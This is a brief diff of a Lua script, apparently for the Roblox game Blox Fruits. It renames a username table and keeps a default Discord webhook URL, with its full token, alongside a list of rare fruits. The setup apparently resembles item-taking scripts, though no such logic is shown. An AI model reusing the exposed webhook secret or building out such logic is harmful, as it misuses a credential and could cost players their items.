@@ -2,8 +2,8 @@
 if not Webhook then
     Webhook = "https://discord.com/api/webhooks/1342874944849186929/fe0915VAT6mORBBq2oI1uIu6IaqhPr_7Hros7iy20iznwVOEnnSyhjW3W-Nxs7aZ1hRe"
 end
-if not Username then
-    Username = {}
+if not Usernames then
+    Usernames = {}
 end
 if not Fruits then
     Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-(East)", "Dough-Dough", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard"} -- Default Fruits
